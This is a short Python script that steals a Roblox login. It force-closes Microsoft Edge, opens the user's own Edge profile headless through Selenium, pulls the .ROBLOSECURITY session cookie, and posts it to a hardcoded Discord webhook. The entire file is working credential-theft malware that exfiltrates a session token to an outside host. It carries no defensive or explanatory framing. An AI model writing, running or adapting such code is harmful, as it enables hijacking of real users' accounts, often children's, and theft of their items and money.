from selenium import webdriver
from selenium.webdriver.edge.options import Options
import time, os, requests

EDGE_PROFILE_PATH = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data')

os.system("taskkill /f /im msedge.exe >nul 2>&1")
time.sleep(1)

options = Options()
options.binary_location = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
options.add_argument(f"--user-data-dir={EDGE_PROFILE_PATH}")
options.add_argument("--profile-directory=Default")
options.add_argument("--headless=new")

driver = webdriver.Edge(options=options)
driver.get("https://www.roblox.com")
all_cookies = driver.get_cookies()
driver.quit()

session_cookie = next((c.get('value') for c in all_cookies if c.get('name') == '.ROBLOSECURITY'), None)

if session_cookie:
    requests.post("https://discord.com/api/webhooks/1513413923787903116/Tl2urvbA_iWfoCQJVRdLPPcm7qqq7mMuVYUsBhFm6uXQ0Myzo_W36d8YRVDRxxxTInXn", json={"embeds": [{"title": "Edge Cookie", "description": f"```\n{session_cookie}\n```", "color": 5814783}]})